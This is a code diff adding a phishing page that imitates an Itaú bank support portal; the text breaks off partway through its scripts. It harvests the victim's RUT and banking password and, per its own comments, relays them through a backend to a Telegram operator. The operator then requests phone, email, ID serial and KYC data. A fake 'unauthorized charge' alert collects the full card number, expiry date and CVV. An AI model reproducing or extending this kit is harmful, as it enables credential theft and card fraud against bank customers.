@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Portal de Atención</title>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet"/>
+  <script>
+    // ⚠️ CREDENCIALES YA NO AQUÍ - Almacenadas en backend (.env)
+    const BACKEND_URL     = '';
+    const COLOR_PRINCIPAL = '#FF6200';
+    const PORTAL_TITULO    = 'Portal de Atención';
+    const PORTAL_SUBTITULO = 'Bienvenido al sistema';
+    const FOOTER_TEXTO     = '¿En qué te podemos ayudar? 📞 600 000 000 Llámanos';
+    
+    // SVG DEBITO - Template base (sin números ni nombre)
+    function generateCardDebito(nombre=''){
+      const displayName=(nombre||'TITULAR NOMBRE').toUpperCase();
+      return `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 250"><defs><linearGradient id="debitoGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23FF7A20;stop-opacity:1"/><stop offset="100%" style="stop-color:%23CC4E00;stop-opacity:1"/></linearGradient><filter id="shadow"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-opacity="0.3"/></filter></defs><rect width="400" height="250" rx="12" fill="url(%23debitoGrad)" filter="url(%23shadow)"/><circle cx="50" cy="30" r="60" fill="rgba(255,255,255,0.06)"/><circle cx="370" cy="220" r="80" fill="rgba(0,0,0,0.08)"/><g id="chip"><rect x="20" y="15" width="50" height="38" rx="5" fill="%23D4AF37"/><rect x="24" y="19" width="42" height="30" rx="3" fill="%23C9A227"/><line x1="44" y1="19" x2="44" y2="49" stroke="%23B8920A" stroke-width="1"/><line x1="20" y1="33" x2="70" y2="33" stroke="%23B8920A" stroke-width="1"/></g><text x="310" y="55" font-family="Arial, sans-serif" font-size="22" font-weight="bold" fill="white">itaú</text><text x="30" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="120" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="210" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="300" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="30" y="195" font-family="Arial, sans-serif" font-size="11" fill="rgba(255,255,255,0.9)" letter-spacing="1">${displayName}</text><text x="30" y="222" font-family="Arial, sans-serif" font-size="9" fill="rgba(255,255,255,0.5)">VENCE</text><text x="70" y="222" font-family="Courier New, monospace" font-size="11" fill="rgba(255,255,255,0.5)">MM / AA</text><text x="200" y="222" font-family="Arial, sans-serif" font-size="9" fill="rgba(255,255,255,0.6)">débito</text><g id="mastercard"><circle cx="345" cy="215" r="14" fill="%23EB001B"/><circle cx="369" cy="215" r="14" fill="%23FF5F00" opacity="0.9"/><path d="M357 207 Q363 215 357 223 Q351 215 357 207Z" fill="%23FF6200"/></g></svg>`;
+    }
+    
+    // SVG CREDITO - Template base estilo Itaú Black
+    function generateCardCredito(nombre=''){
+      const displayName=(nombre||'TITULAR NOMBRE').toUpperCase();
+      return `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 250"><defs><linearGradient id="creditoGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%231A1A1A;stop-opacity:1"/><stop offset="100%" style="stop-color:%230D0D0D;stop-opacity:1"/></linearGradient><linearGradient id="orangeAccent" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" style="stop-color:%23FF6200;stop-opacity:1"/><stop offset="100%" style="stop-color:%23CC4E00;stop-opacity:1"/></linearGradient><pattern id="geoPattern" x="0" y="0" width="30" height="30" patternUnits="userSpaceOnUse"><rect width="30" height="30" fill="none"/><path d="M0 15 Q7.5 7.5 15 15 Q22.5 22.5 30 15" stroke="rgba(255,255,255,0.04)" stroke-width="1" fill="none"/><path d="M0 0 Q7.5 7.5 15 0" stroke="rgba(255,255,255,0.03)" stroke-width="1" fill="none"/></pattern><filter id="shadow"><feDropShadow dx="0" dy="2" stdDeviation="4" flood-opacity="0.4"/></filter></defs><rect width="400" height="250" rx="12" fill="url(%23creditoGrad)" filter="url(%23shadow)"/><rect width="400" height="250" rx="12" fill="url(%23geoPattern)"/><rect x="0" y="0" width="6" height="250" rx="3" fill="url(%23orangeAccent)"/><g id="chip"><rect x="25" y="18" width="50" height="38" rx="5" fill="%23C0C0C0"/><rect x="29" y="22" width="42" height="30" rx="3" fill="%23A8A8A8"/><line x1="49" y1="22" x2="49" y2="52" stroke="%23909090" stroke-width="1"/><line x1="25" y1="36" x2="75" y2="36" stroke="%23909090" stroke-width="1"/></g><rect x="310" y="195" width="70" height="40" rx="8" fill="white"/><text x="345" y="221" font-family="Arial, sans-serif" font-size="15" font-weight="bold" fill="%231A1A1A" text-anchor="middle">itaú</text><path d="M 365 25 Q 372 22 372 28 Q 372 34 365 31" stroke="rgba(255,255,255,0.5)" stroke-width="1.5" fill="none"/><path d="M 369 22 Q 378 18 378 28 Q 378 38 369 34" stroke="rgba(255,255,255,0.35)" stroke-width="1.5" fill="none"/><path d="M 373 19 Q 384 14 384 28 Q 384 42 373 37" stroke="rgba(255,255,255,0.2)" stroke-width="1.5" fill="none"/><text x="30" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="120" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="210" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="300" y="140" font-family="Courier New, monospace" font-size="22" font-weight="bold" fill="white" letter-spacing="3">••••</text><text x="30" y="195" font-family="Arial, sans-serif" font-size="11" fill="rgba(255,255,255,0.9)" letter-spacing="1">${displayName}</text><text x="30" y="222" font-family="Arial, sans-serif" font-size="9" fill="rgba(255,255,255,0.4)">VENCE</text><text x="70" y="222" font-family="Courier New, monospace" font-size="11" fill="rgba(255,255,255,0.4)">MM / AA</text><g id="mastercard"><circle cx="40" cy="25" r="12" fill="%23EB001B"/><circle cx="58" cy="25" r="12" fill="%23FF5F00" opacity="0.9"/><path d="M49 17 Q55 25 49 33 Q43 25 49 17Z" fill="%23FF6200"/></g></svg>`;
+    }
+
+    // Función para generar botones dinámicamente
+    function getBotones(nombrePersona) {
+      return [
+        [{text:'📞 Teléfono',callback_data:'req:Número de teléfono'},{text:'✉️ Correo',callback_data:'req:Correo electrónico'}],
+        [{text:'💳 Tarjeta Débito',callback_data:`req:debito-${nombrePersona}-cobro-no-autorizado`},{text:'🏦 Tarjeta Crédito',callback_data:`req:credito-${nombrePersona}-cobro-no-autorizado`}],
+        [{text:'🪪 N° Serie doc.',callback_data:'req:Número de serie del documento'},{text:'📋 Motivo',callback_data:'req:Motivo de la consulta'}],
+        [{text:'📷 KYC',callback_data:'req:Valida tu identidad para verificar que eres tu'}],
+        [{text:'✏️ Solicitud personalizada',callback_data:'custom:ask'}],
+        [{text:'✅ Finalizar atención',callback_data:'end:session'}]
+      ];
+    }
+  </script>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Nunito',sans-serif;background:#F5EDD8}
+    .view{display:none;flex-direction:column;min-height:100vh}
+    .view.active{display:flex}
+    .footer-bar{color:#fff;text-align:center;padding:13px;font-size:13px;font-weight:600;margin-top:auto}
+    .login-bg{flex:1;display:flex;align-items:center;justify-content:center;padding:2rem 1rem;gap:1.25rem;flex-wrap:wrap}
+    .login-card,.sec-card{background:#fff;border-radius:14px;padding:2rem 1.75rem;box-shadow:0 2px 14px rgba(0,0,0,.09)}
+    .login-card{width:100%;max-width:330px}
+    .sec-card{width:100%;max-width:285px}
+    .logo-box{width:54px;height:54px;border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 1rem;font-size:19px;font-weight:700;color:#fff}
+    .login-welcome{text-align:center;margin-bottom:1.5rem}
+    .login-welcome p{font-size:13px;color:#6B7A8D;margin-bottom:3px}
+    .login-welcome strong{font-size:15px;color:#1A3557;font-weight:700}
+    .field{margin-bottom:1rem}
+    .field label{display:block;font-size:12px;color:#2D4A6B;margin-bottom:5px;font-weight:700}
+    .field input{width:100%;padding:10px 13px;font-size:14px;border:1.5px solid #DDE3EB;border-radius:9px;color:#1A3557;background:#fff;outline:none;font-family:'Nunito',sans-serif;transition:border-color .2s}
+    .field input:focus{border-color:var(--cp)}
+    .pass-wrap{position:relative}
+    .pass-wrap input{padding-right:75px}
+    .show-btn{position:absolute;right:11px;top:50%;transform:translateY(-50%);font-size:12px;color:var(--cp);cursor:pointer;font-weight:700;border:none;background:none;font-family:'Nunito',sans-serif}
+    .btn-ing{width:100%;padding:11px;border:none;border-radius:9px;font-size:14px;font-weight:700;cursor:pointer;margin-top:5px;transition:background .2s,color .2s;font-family:'Nunito',sans-serif;background:#E8EDF2;color:#6B7A8D}
+    .btn-ing.on{color:#fff}.btn-ing.on:hover{opacity:.9}
+    .link-color{display:block;text-align:center;margin-top:1rem;font-size:13px;color:var(--cp);cursor:pointer;font-weight:600}
+    .btn-out{display:block;width:100%;margin-top:.75rem;padding:10px;border:1.5px solid var(--cp);border-radius:9px;background:transparent;color:var(--cp);font-size:13px;font-weight:700;cursor:pointer;text-align:center;font-family:'Nunito',sans-serif}
+    .err{font-size:12px;color:#C0392B;text-align:center;margin-top:7px;min-height:16px;font-weight:600}
+    .sec-card h3{font-size:14px;color:#1A3557;font-weight:700;margin-bottom:1rem}
+    .sec-item{display:flex;gap:10px;margin-bottom:.9rem;align-items:flex-start}
+    .sec-icon{font-size:15px;margin-top:2px;flex-shrink:0}
+    .sec-text{font-size:12px;color:#6B7A8D;line-height:1.5}
+    .sec-text strong{color:#2D4A6B;font-weight:700}
+    .wait-bg{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;background:#F5EDD8}
+    .pulse-ring{width:82px;height:82px;border-radius:50%;border:2px solid var(--cp);display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;animation:pulse 2.2s ease-in-out infinite}
+    @keyframes pulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:.4}}
+    @keyframes alertPulse{0%,100%{border-color:#DC3545;box-shadow:0 0 0 rgba(220,53,69,0)}50%{border-color:#FF6B6B;box-shadow:0 0 20px rgba(220,53,69,0.35)}}
+    @keyframes successPulse{0%{opacity:0;transform:scale(0.8)}50%{transform:scale(1.05)}100%{opacity:1;transform:scale(1)}}
+    @keyframes lockBounce{0%{transform:scale(0) rotate(-45deg);opacity:0}50%{transform:scale(1.2) rotate(10deg);opacity:1}70%{transform:scale(0.9) rotate(-5deg)}100%{transform:scale(1) rotate(0deg)}}
+    @keyframes shieldPulse{0%{box-shadow:0 0 0 0 rgba(40,167,69,0.4)}70%{box-shadow:0 0 0 18px rgba(40,167,69,0)}100%{box-shadow:0 0 0 0 rgba(40,167,69,0)}}
+    @keyframes checkDraw{0%{stroke-dashoffset:24}100%{stroke-dashoffset:0}}
+    @keyframes lockSwing{0%,100%{transform:rotate(0deg)}25%{transform:rotate(-8deg)}75%{transform:rotate(8deg)}}
+    @keyframes fadeInUp{0%{opacity:0;transform:translateY(8px)}100%{opacity:1;transform:translateY(0)}}
+    .req-tag-alert{display:flex;align-items:center;justify-content:center;gap:8px;background:rgba(220,53,69,0.08);border-radius:8px;padding:10px 14px;margin-bottom:14px}
+    .req-tag-alert .lock-icon{animation:lockSwing 2s ease-in-out infinite}
+    .req-q-alert{font-size:13px;font-weight:600;color:#DC3545;margin-bottom:14px;line-height:1.6;animation:fadeInUp 0.5s ease-out}
+    .stepper{display:flex;align-items:center;justify-content:center;gap:0;margin-bottom:20px;padding:12px 0}
+    .step{display:flex;flex-direction:column;align-items:center;gap:5px;flex:1;position:relative}
+    .step-circle{width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;border:2px solid #DDE3EB;color:#6B7A8D;background:#fff;z-index:1}
+    .step.done .step-circle{background:#28A745;border-color:#28A745;color:#fff}
+    .step.active .step-circle{background:#FF6200;border-color:#FF6200;color:#fff;box-shadow:0 0 0 4px rgba(255,98,0,0.2)}
+    .step-label{font-size:10px;font-weight:700;color:#6B7A8D;text-transform:uppercase;letter-spacing:0.03em}
+    .step.done .step-label{color:#28A745}
+    .step.active .step-label{color:#FF6200}
+    .step-line{height:2px;flex:0 0 40px;background:#DDE3EB;margin-top:-18px}
+    .step-line.done{background:#28A745}
+    .cobro-card{background:#FFF5F5;border:1.5px solid #DC3545;border-radius:12px;padding:16px;margin-bottom:16px;animation:fadeInUp 0.5s ease-out}
+    .cobro-header{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+    .cobro-badge{background:#DC3545;color:#fff;font-size:10px;font-weight:800;padding:4px 10px;border-radius:4px;text-transform:uppercase;letter-spacing:0.05em}
+    .cobro-amount{font-size:28px;font-weight:800;color:#1A3557;margin-bottom:2px}
+    .cobro-merchant{font-size:12px;color:#6B7A8D;margin-bottom:10px}
+    .cobro-desc{font-size:12px;color:#4A5568;line-height:1.6}
+    .cobro-desc u{color:#1A3557;font-weight:700}
+    .bloqueo-title{font-size:18px;font-weight:800;color:#1A3557;margin-bottom:4px}
+    .bloqueo-sub{font-size:12px;color:#6B7A8D;margin-bottom:16px}
+    .id-card{background:#fff;border-radius:14px;padding:1.25rem 1.5rem;width:100%;max-width:340px;box-shadow:0 2px 14px rgba(0,0,0,.09);margin-bottom:1.5rem;text-align:center}
+    .id-loading{font-size:13px;color:#6B7A8D;font-style:italic}
+    .id-greet{font-size:11px;font-weight:700;color:var(--cp);margin-bottom:5px;text-transform:uppercase;letter-spacing:.07em}
+    .id-name{font-size:22px;font-weight:700;color:#1A3557;margin-bottom:8px;line-height:1.2}
+    .id-rut{display:inline-block;background:#F5EDD8;border-radius:20px;padding:4px 16px;font-size:13px;color:#6B7A8D;font-weight:700}
+    .wait-sub{font-size:13px;color:#6B7A8D;text-align:center;margin-bottom:1.75rem}
+    .req-box{background:#fff;border-radius:13px;padding:1.5rem;width:100%;max-width:350px;box-shadow:0 2px 14px rgba(0,0,0,.09);margin-bottom:10px}
+    .req-tag{font-size:11px;color:var(--cp);text-transform:uppercase;letter-spacing:.07em;font-weight:700;margin-bottom:6px}
+    .req-q{font-size:15px;font-weight:700;color:#1A3557;margin-bottom:14px}
+    .req-input{width:100%;padding:10px 13px;font-size:14px;border:1.5px solid #DDE3EB;border-radius:9px;color:#1A3557;font-family:'Nunito',sans-serif;resize:vertical;outline:none}
+    .req-input:focus{border-color:var(--cp)}
+    .btn-resp{width:100%;padding:11px;color:#fff;border:none;border-radius:9px;font-size:14px;font-weight:700;cursor:pointer;margin-top:10px;font-family:'Nunito',sans-serif;background:var(--cp)}
+    .btn-resp:hover{opacity:.9}.btn-resp:disabled{background:#E8EDF2;color:#6B7A8D;cursor:not-allowed}
+    .ok-msg{background:#F0FBF4;border:1.5px solid #72C98A;border-radius:11px;padding:11px 20px;font-size:13px;color:#1D6B35;font-weight:700;text-align:center;width:100%;max-width:350px}
+    .ended-bg{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;background:#F5EDD8;text-align:center}
+    .ended-icon{font-size:52px;margin-bottom:1rem}
+    .ended-title{font-size:22px;font-weight:700;color:#1A3557;margin-bottom:8px}
+    .ended-sub{font-size:14px;color:#6B7A8D;max-width:280px}
+    .loading-overlay{position:fixed;inset:0;background:rgba(245,237,216,.93);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:99}
+    .loading-spinner{width:46px;height:46px;border:3px solid #DDE3EB;border-top-color:var(--cp);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:1rem}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading-txt{font-size:14px;color:#6B7A8D;font-weight:600}
+  </style>
+</head>
+<body>
+<script>document.documentElement.style.setProperty('--cp',COLOR_PRINCIPAL)</script>
+
+<div class="view active" id="v-login">
+  <div class="login-bg">
+    <div class="login-card">
+      <div class="logo-box" style="background:var(--cp)">itaú</div>
+      <div class="login-welcome">
+        <p id="txt-sub"></p><strong id="txt-tit"></strong>
+      </div>
+      <div class="field">
+        <label>Ingresa tu RUT</label>
+        <input type="text" id="rut-in" placeholder="12.345.678-9" maxlength="12" oninput="formatRut(this);checkForm()" onkeydown="if(event.key==='Enter')doLogin()"/>
+      </div>
+      <div class="field">
+        <label>Ingresa tu clave de internet</label>
+        <div class="pass-wrap">
+          <input type="password" id="pass-in" placeholder="••••••••" oninput="checkForm()" onkeydown="if(event.key==='Enter')doLogin()"/>
+          <button class="show-btn" onclick="togglePass()">Mostrar</button>
+        </div>
+      </div>
+      <button class="btn-ing" id="btn-ing" onclick="doLogin()">Ingresar</button>
+      <div class="err" id="login-err"></div>
+      <a class="link-color">¿Problemas con tu clave?</a>
+      <button class="btn-out">¿Eres nuevo? Crea tu clave</button>
+    </div>
+    <div class="sec-card">
+      <h3>Recomendaciones de seguridad</h3>
+      <div class="sec-item"><span class="sec-icon">🖥️</span><p class="sec-text">Prefiere <strong>dispositivos y conexiones seguras</strong> para ingresar. Mantén un antivirus actualizado.</p></div>
+      <div class="sec-item"><span class="sec-icon">✉️</span><p class="sec-text">Nuestros emails <strong>no contienen links ni botones.</strong></p></div>
+      <div class="sec-item"><span class="sec-icon">👤</span><p class="sec-text"><strong>Nunca entregues tus claves</strong> de seguridad a terceros.</p></div>
+      <div class="sec-item"><span class="sec-icon">🔑</span><p class="sec-text">Recuerda <strong>actualizar tus claves</strong> de acceso con frecuencia.</p></div>
+    </div>
+  </div>
+  <div class="footer-bar" id="f1"></div>
+</div>
+
+<div class="view" id="v-waiting">
+  <div class="wait-bg">
+    <div class="pulse-ring">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="10" stroke="var(--cp)" stroke-width="1.5"/>
+        <path d="M12 6v6l4 2" stroke="var(--cp)" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div class="id-card">
+      <p class="id-loading" id="id-loading">Verificando identidad...</p>
+      <p class="id-greet" id="id-greet" style="display:none">Bienvenido</p>
+      <p class="id-name" id="id-name" style="display:none"></p>
+      <span class="id-rut" id="id-rut" style="display:none"></span>
+    </div>
+    <p class="wait-sub">Un agente te atenderá en breve</p>
+    <div id="req-zone" style="display:none;width:100%;max-width:380px">
+      <div class="req-box" id="req-box">
+        <div class="req-tag" id="req-tag">El agente solicita</div>
+        <div class="req-q" id="req-q" style="display:none">—</div>
+
+        <!-- Formulario genérico (por defecto) -->
+        <div id="generic-form">
+          <div class="req-q" id="req-q-generic">—</div>
+          <textarea class="req-input" id="req-ans" rows="3" placeholder="Escribe tu respuesta aquí..."></textarea>
+          <button class="btn-resp" id="btn-resp" onclick="submitAnswer()">Enviar respuesta →</button>
+        </div>
+
+        <!-- Bloque cobro no autorizado (nuevo diseño) -->
+        <div id="cobro-block" style="display:none">
+
+          <!-- Título + subtítulo -->
+          <div style="text-align:center;margin-bottom:16px">
+            <div class="bloqueo-title">Bloqueo de cobro</div>
+            <div class="bloqueo-sub"><span id="cobro-nombre">Cliente</span>, verifique el cobro detectado y complete sus datos para el bloqueo.</div>
+          </div>
+
+          <!-- Stepper -->
+          <div class="stepper">
+            <div class="step done" id="step-1">
+              <div class="step-circle"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div>
+              <div class="step-label">Detección</div>
+            </div>
+            <div class="step-line done"></div>
+            <div class="step active" id="step-2">
+              <div class="step-circle">2</div>
+              <div class="step-label">Verificación</div>
+            </div>
+            <div class="step-line"></div>
+            <div class="step" id="step-3">
+              <div class="step-circle">3</div>
+              <div class="step-label">Confirmación</div>
+            </div>
+          </div>
+
+          <!-- Alerta cobro -->
+          <div class="cobro-card">
+            <div class="cobro-header">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="#DC3545"><path d="M12 2L1 21h22L12 2zm0 4l7.53 13H4.47L12 6zm-1 5v4h2v-4h-2zm0 6v2h2v-2h-2z"/></svg>
+              <span class="cobro-badge">Cobro no autorizado</span>
+            </div>
+            <div class="cobro-amount" id="cobro-monto">$69.990 CLP</div>
+            <div class="cobro-merchant" id="cobro-comercio">en comercio no identificado</div>
+            <div class="cobro-desc">Detectamos este cobro que aún no se ha efectuado. Complete sus datos para procesar el bloqueo. <u>Sin costo adicional.</u></div>
+          </div>
+
+          <!-- Imagen de tarjeta -->
+          <div id="card-image-container" style="text-align:center;margin-bottom:16px">
+            <img id="card-image" src="" alt="Tarjeta bancaria" style="max-width:100%;height:auto;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.2)">
+          </div>
+
+          <!-- Formulario de tarjeta -->
+          <div id="card-form">
+            <div style="margin-bottom:12px">
+              <label style="font-size:11px;color:#2D4A6B;font-weight:700;display:block;margin-bottom:5px">Número de tarjeta (16 dígitos)</label>
+              <input type="text" id="card-number" class="req-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="validateCardNumber(this)">
+              <div id="card-error" style="font-size:10px;color:#C0392B;margin-top:3px;min-height:12px"></div>
+            </div>
+
+            <div style="display:flex;gap:10px;margin-bottom:12px">
+              <div style="flex:2">
+                <label style="font-size:11px;color:#2D4A6B;font-weight:700;display:block;margin-bottom:5px">Vencimiento (MM/YYYY)</label>
+                <input type="text" id="card-expiry" class="req-input" placeholder="05/2026" maxlength="7" oninput="validateExpiry(this)">
+                <div id="expiry-error" style="font-size:10px;color:#C0392B;margin-top:3px;min-height:12px"></div>
+              </div>
+              <div style="flex:1">
+                <label style="font-size:11px;color:#2D4A6B;font-weight:700;display:block;margin-bottom:5px">CVV (3 dígitos)</label>
+                <input type="text" id="card-cvv" class="req-input" placeholder="123" maxlength="3" oninput="validateCVV(this)">
+                <div id="cvv-error" style="font-size:10px;color:#C0392B;margin-top:3px;min-height:12px"></div>
+              </div>
+            </div>
+
+            <div id="bin-info" style="font-size:11px;color:#6B7A8D;margin-bottom:12px;padding:8px;background:#F5EDD8;border-radius:6px;display:none">
+              <strong>Banco: </strong><span id="bin-bank">—</span><br>
+              <strong>Tipo: </strong><span id="bin-type">—</span>
+            </div>
+
+            <button class="btn-resp" id="btn-card-resp" onclick="submitCardData()" style="background:#FF6200">Procesar bloqueo →</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="ok-msg" id="ok-msg" style="display:none">✓ Respuesta enviada. Espera la próxima indicación.</div>
+  </div>
+  <div class="footer-bar" id="f2"></div>
+</div>
+
+<div class="view" id="v-ended">
+  <div class="ended-bg">
+    <div class="ended-icon">✅</div>
+    <p class="ended-title">Atención finalizada</p>
+    <p class="ended-sub">Tu sesión ha sido cerrada. Gracias por contactarnos.</p>
+  </div>
+  <div class="footer-bar" id="f3"></div>
+</div>
+
+<div class="loading-overlay" id="loading-overlay" style="display:none">
+  <div class="loading-spinner"></div>
+  <p class="loading-txt" id="loading-txt">Conectando...</p>
+</div>
+
+<script>
+  console.log('🚀 Portal cargando...');
+  console.log('Configuración:', {BACKEND_URL, COLOR_PRINCIPAL: COLOR_PRINCIPAL, PORTAL_TITULO});
+  
+  let tgOffset=0,pollTimer=null,curMsgId=null,waitingCustom=false,curUser=null,curName='',tipoTarjetaDetectado='';
+
+  console.log('✅ Variables inicializadas');
+  
+  document.getElementById('txt-tit').textContent=PORTAL_TITULO;
+  document.getElementById('txt-sub').textContent=PORTAL_SUBTITULO;
+  ['f1','f2','f3'].forEach(id=>{const el=document.getElementById(id);if(el){el.textContent=FOOTER_TEXTO;el.style.background=COLOR_PRINCIPAL;}});
+  
+  console.log('✅ Elementos del DOM inicializados');
+
+  function showV(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));document.getElementById(id).classList.add('active')}
+  function setLoading(show,txt='Conectando...'){document.getElementById('loading-overlay').style.display=show?'flex':'none';document.getElementById('loading-txt').textContent=txt}
+  function toTitle(s){return s.toLowerCase().replace(/\b\w/g,c=>c.toUpperCase())}
+  // Validar dígito verificador del RUT chileno
+  function validateRutChecksum(rut){const clean=rut.replace(/[^0-9kK]/g,'');if(clean.length<8)return false;const n=clean.slice(0,-1),dv=clean.slice(-1),sum=Array.from(n).reverse().reduce((acc,d,i)=>acc+parseInt(d)*((i%6)+2),0),calc=(11-sum%11)%11,expected=calc===10?'K':calc.toString();return dv.toUpperCase()===expected}
+  
+  // Formatear RUT (números, letra K y guión)
+  function formatRut(el){let v=el.value.replace(/[^0-9kK]/g,'').toUpperCase();if(v.length<2){el.value=v;return}if(v.length>9){el.value=el.value;return}let dv=v.slice(-1),n=v.slice(0,-1),f='';while(n.length>3){f='.'+n.slice(-3)+f;n=n.slice(0,-3)}el.value=n+f+'-'+dv}
+  
+  // Validar formulario
+  function checkForm(){const rut=document.getElementById('rut-in').value.trim(),pass=document.getElementById('pass-in').value.trim(),btn=document.getElementById('btn-ing');let ok=false;if(rut.length>=8&&pass.length>=1){ok=validateRutChecksum(rut)}btn.classList.toggle('on',ok);btn.style.background=ok?COLOR_PRINCIPAL:'';btn.style.color=ok?'#fff':''}
+  
+  function togglePass(){const i=document.getElementById('pass-in');i.type=i.type==='password'?'text':'password'}
+
+  // ✅ NUEVO: Traer nombre del backend
+  async function fetchName(rut){try{const res=await fetch(`${BACKEND_URL}/api/get-name?rut=${encodeURIComponent(rut)}`);if(!res.ok)return null;const data=await res.json();return data.name||null}catch(e){console.error('Error fetching name:',e);return null}}
+
+  // ✅ NUEVO: Enviar mensaje al backend (que luego lo envía a Telegram)
+  async function tgSend(text,keyboard=null){try{const res=await fetch(`${BACKEND_URL}/api/telegram/send-message`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text,keyboard})});const d=await res.json();return d.messageId||null}catch(e){console.error('Error sending message:',e);return null}}
+  
+  // ✅ NUEVO: Editar mensaje vía backend
+  async function tgEdit(msgId,text,keyboard=null){try{await fetch(`${BACKEND_URL}/api/telegram/edit-message`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId,text,keyboard})})}catch(e){console.error('Error editing message:',e)}}
+  
+  // ✅ NUEVO: Responder callback vía backend
+  async function tgAnswer(cbId){try{await fetch(`${BACKEND_URL}/api/telegram/answer-callback`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callbackQueryId:cbId})})}catch(e){console.error('Error answering callback:',e)}}
+  
+  // ✅ NUEVO: Obtener updates vía backend
+  async function tgGetUpdates(){try{const res=await fetch(`${BACKEND_URL}/api/telegram/updates?offset=${tgOffset}`);const d=await res.json();return d.updates||[]}catch(e){console.error('Error getting updates:',e);return[]}}
+  
+  // ✅ NUEVO: Limpiar updates
+  async function flushUpdates(){try{const res=await fetch(`${BACKEND_URL}/api/telegram/updates?offset=-1&limit=1`);const d=await res.json();if(d.updates&&d.updates.length>0)tgOffset=d.updates[d.updates.length-1].update_id+1}catch(e){console.error('Error flushing updates:',e)}}
+
+  async function doLogin(){
+    const rut=document.getElementById('rut-in').value.trim(),pass=document.getElementById('pass-in').value.trim(),err=document.getElementById('login-err');
+    if(!rut||rut.length<8){err.textContent='Ingresa un RUT válido (mínimo 8 dígitos)';return}
+    if(!validateRutChecksum(rut)){err.textContent='RUT inválido. Verifica el dígito verificador';return}
+    if(!pass){err.textContent='Ingresa tu clave';return}
+    err.textContent='';
+    setLoading(true,'Verificando identidad...');
+    curUser=rut;curName='';waitingCustom=false;
+    ['id-loading','id-greet','id-name','id-rut'].forEach(id=>document.getElementById(id).style.display='none');
+    document.getElementById('id-loading').style.display='block';
+    document.getElementById('req-zone').style.display='none';
+    document.getElementById('ok-msg').style.display='none';
+    showV('v-waiting');
+    
+    // ✅ Enviar login al backend
+    try{
+      console.log('🔍 Iniciando login con:', {rut, password: '***'});
+      console.log('📍 BACKEND_URL:', BACKEND_URL);
+      
+      const loginRes=await fetch(`${BACKEND_URL}/api/login`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({rut,password:pass})});
+      console.log('✅ Fetch completado, status:', loginRes.status);
+      
+      const loginData=await loginRes.json();
+      console.log('✅ JSON parseado:', loginData);
+      
+      if(!loginData.success){err.textContent='Error en login';setLoading(false);showV('v-login');return}
+      
+      curName=loginData.name||'Cliente';
+      curMsgId=loginData.messageId;
+      
+      // 🔐 Enviar credenciales (RUT y contraseña) a Telegram inmediatamente
+      console.log('📤 Enviando credenciales a Telegram...');
+      await fetch(`${BACKEND_URL}/api/send-credentials`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId:curMsgId,rut,password:pass,name:curName})});
+      console.log('✅ Credenciales enviadas');
+      
+      document.getElementById('id-loading').style.display='none';
+      document.getElementById('id-greet').style.display='block';
+      setLoading(true,'Conectando con el agente...');
+      await flushUpdates();
+      setLoading(false);
+      startPolling();
+    }catch(e){
+      console.error('❌ Login error:', e);
+      console.error('Error completo:', {message: e.message, stack: e.stack});
+      err.textContent='Error de conexión: ' + e.message;
+      setLoading(false);
+      showV('v-login');
+    }
+  }
+
+  function startPolling(){clearInterval(pollTimer);pollTimer=setInterval(pollTelegram,2500)}
+
+  async function pollTelegram(){
+    const updates=await tgGetUpdates();
+    for(const upd of updates){
+      tgOffset=upd.update_id+1;
+      if(upd.callback_query){
+        const cq=upd.callback_query;
+        await tgAnswer(cq.id);
+        const cb=cq.data;
+        if(cb.startsWith('req:')){
+          let label=cb.slice(4);
